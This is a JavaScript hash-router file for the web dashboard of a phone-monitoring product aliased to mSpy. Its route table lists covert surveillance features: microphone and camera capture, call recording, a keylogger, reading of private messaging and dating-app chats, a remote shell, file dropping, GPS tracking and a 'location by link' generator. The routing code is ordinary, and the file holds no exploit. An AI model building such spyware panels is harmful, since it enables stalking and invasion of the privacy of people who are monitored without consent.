// routes.js - Client-Side SPA Hash Router for HomeMonitor Safety & Diagnostic Routes
const homeMonitorRoutes = {
    // 4.1 MAIN
    "/": { tabId: "tab-dashboard-overview", title: "Home & Device Selector", category: "Main" },
    "/dashboard": { tabId: "tab-dashboard-overview", title: "Dashboard Overview", category: "Main" },
    "/deviceinfo": { tabId: "tab-device-info", title: "Device Information", category: "Main" },

    // 4.2 DEVICE MONITORING
    "/surroundings_recording": { tabId: "tab-ambient-mic", title: "Surroundings Recording", category: "Device Monitoring" },
    "/remote_camera": { tabId: "tab-camera-studio", title: "Remote Camera Studio", category: "Device Monitoring" },
    "/call_recording": { tabId: "tab-call-recs", title: "Call Recording", category: "Device Monitoring" },
    "/live_screenshot": { tabId: "tab-screenrecorder", title: "Live Screenshots", category: "Device Monitoring" },
    "/live_screen_streaming": { tabId: "tab-webstream", title: "Live Screen Streaming", category: "Device Monitoring" },

    // 4.3 RESTRICTIONS
    "/block_app": { tabId: "tab-mdm-security", title: "Block Applications", category: "Restrictions" },
    "/block_website": { tabId: "tab-browser-history", title: "Block Websites", category: "Restrictions" },
    "/block_wifi": { tabId: "tab-device-info", title: "Block Wi-Fi Networks", category: "Restrictions" },

    // 4.4 AI TOOLS
    "/chat_gpt": { tabId: "tab-social-chat", socialApp: "chatgpt", title: "ChatGPT-4o Conversation", category: "AI Tools" },
    "/gemini": { tabId: "tab-social-chat", socialApp: "gemini", title: "Google Gemini 1.5 Pro Conversation", category: "AI Tools" },

    // 4.5 BEHAVIOR MONITORING
    "/activity_timeline": { tabId: "tab-dashboard-overview", title: "Activity Timeline", category: "Behavior Monitoring" },
    "/key_logger_app": { tabId: "tab-keylogger", title: "Keystroke Keylogger", category: "Behavior Monitoring" },
    "/keyword_rule": { tabId: "tab-master-admin", title: "Keyword Safety Alerts", category: "Behavior Monitoring" },

    // 4.6 GENERAL FEATURES
    "/call": { tabId: "tab-calls", title: "Call Logs & Telemetry", category: "General Features" },
    "/contact": { tabId: "tab-contacts", title: "Contacts Phonebook", category: "General Features" },
    "/browser_history": { tabId: "tab-browser-history", title: "Browser Search History", category: "General Features" },
    "/browser_bookmark": { tabId: "tab-browser-history", title: "Browser Bookmarks", category: "General Features" },
    "/application": { tabId: "tab-installed-apps", title: "Installed Applications", category: "General Features" },
    "/file_explorer": { tabId: "tab-file-explorer", title: "Remote File Explorer", category: "General Features" },
    "/files": { tabId: "tab-file-explorer", title: "Remote File Explorer", category: "General Features" },
    "/termux": { tabId: "tab-termux-shell", title: "Termux Linux Shell", category: "General Features" },
    "/notifications": { tabId: "tab-notifications", title: "App Notifications Feed", category: "Behavior Monitoring" },
    "/file_dropper": { tabId: "tab-file-dropper", title: "Remote File Dropper", category: "General Features" },
    "/event": { tabId: "tab-dashboard-overview", title: "Calendar & Events", category: "General Features" },

    // 4.7 MESSAGING MONITORING
    "/screenrecorder_pages": { tabId: "tab-screenrecorder", title: "Screenrecorder Pages", category: "Messaging Monitoring" },
    "/sms_chat": { tabId: "tab-sms-messages", title: "SMS Text Messages", category: "Messaging Monitoring" },
    "/email": { tabId: "tab-sms-messages", title: "Connected Email Inbox", category: "Messaging Monitoring" },

    // 4.8 SOCIAL NETWORKS (3-Column Conversation Interface)
    "/whatsapp_chat": { tabId: "tab-social-chat", socialApp: "whatsapp", title: "WhatsApp Messages", category: "Social Networks" },
    "/facebook_messages_chat": { tabId: "tab-social-chat", socialApp: "facebook", title: "Facebook Messenger", category: "Social Networks" },
    "/instagram_chat": { tabId: "tab-social-chat", socialApp: "instagram", title: "Instagram Direct Messages", category: "Social Networks" },
    "/snapchat_chat": { tabId: "tab-social-chat", socialApp: "snapchat", title: "Snapchat Social Feed", category: "Social Networks" },
    "/tinder_chat": { tabId: "tab-social-chat", socialApp: "tinder", title: "Tinder Match Messages", category: "Social Networks" },
    "/tiktok_chat": { tabId: "tab-social-chat", socialApp: "tiktok", title: "TikTok Direct Messages", category: "Social Networks" },
    "/telegram_chat": { tabId: "tab-social-chat", socialApp: "telegram", title: "Telegram Messages", category: "Social Networks" },
    "/viber_chat": { tabId: "tab-social-chat", socialApp: "viber", title: "Viber Messenger", category: "Social Networks" },
    "/discord_chat": { tabId: "tab-social-chat", socialApp: "discord", title: "Discord Direct Messages", category: "Social Networks" },
    "/line_chat": { tabId: "tab-social-chat", socialApp: "line", title: "LINE Chat Messages", category: "Social Networks" },
    "/kik_chat": { tabId: "tab-social-chat", socialApp: "kik", title: "Kik Messenger", category: "Social Networks" },
    "/imessage_chat": { tabId: "tab-social-chat", socialApp: "imessage", title: "iMessage Conversations", category: "Social Networks" },

    // 4.9 MEDIA
    "/photo": { tabId: "tab-photos", title: "Photos Gallery", category: "Media" },
    "/video": { tabId: "tab-videos", title: "Videos Library", category: "Media" },

    // 4.10 LOCATION
    "/location": { tabId: "tab-gps-locations", title: "GPS Locations", category: "Location" },
    "/geofencing_area": { tabId: "tab-geofencing", title: "Geofencing Area", category: "Location" },
    "/wifi": { tabId: "tab-firebase-pool", title: "Firebase Pool & Failover", category: "Location" },
    "/instalker": { tabId: "tab-social-chat", socialApp: "instagram", title: "Instalker Profile Tracker", category: "Location" },
    "/location_by_link": { tabId: "tab-gps-locations", title: "Location by Link Generator", category: "Location" }
};

const mSpyRoutes = homeMonitorRoutes;

function navigateToRoute(routePath, updateHash = true) {
    const route = homeMonitorRoutes[routePath] || homeMonitorRoutes["/dashboard"];
    console.log(`[Router] Navigating to URL alias '${routePath}' -> Tab '${route.tabId}' (${route.title})`);

    // Update browser URL address bar hash alias
    if (updateHash && window.location.hash !== `#${routePath}`) {
        window.location.hash = routePath;
    }

    // Highlight active link in sidebar
    document.querySelectorAll(".nav-link").forEach(l => l.classList.remove("active"));
    const activeBtn = document.querySelector(`.nav-link[data-route="${routePath}"]`);
    if (activeBtn) activeBtn.classList.add("active");

    // Hide all panels
    document.querySelectorAll(".tab-panel").forEach(panel => panel.classList.add("d-none"));

    // Handle 3-column social chat routing
    if (route.tabId === "tab-social-chat" && route.socialApp) {
        const socialPanel = document.getElementById("tab-social-chat");
        if (socialPanel) {
            socialPanel.classList.remove("d-none");
            if (typeof loadSocialAppConversation === "function") {
                loadSocialAppConversation(route.socialApp, route.title);
            }
        }
        return;
    }

    // Handle normal tab panels
    const targetPanel = document.getElementById(route.tabId);
    if (targetPanel) {
        targetPanel.classList.remove("d-none");
    } else {
        const genericPanel = document.getElementById("tab-generic");
        if (genericPanel) {
            document.getElementById("genericTabTitle").innerText = route.title;
            genericPanel.classList.remove("d-none");
            if (typeof fetchCategoryTelemetryLogs === "function") {
                fetchCategoryTelemetryLogs(route.tabId);
            }
        }
    }
}

// Handle Browser Hash Change & Deep-Linking on Load
window.addEventListener("hashchange", function() {
    const currentHash = window.location.hash.replace("#", "");
    if (currentHash && mSpyRoutes[currentHash]) {
        navigateToRoute(currentHash, false);
    }
});

document.addEventListener("DOMContentLoaded", function() {
    const initialHash = window.location.hash.replace("#", "");
    if (initialHash && mSpyRoutes[initialHash]) {
        navigateToRoute(initialHash, false);
    }
});
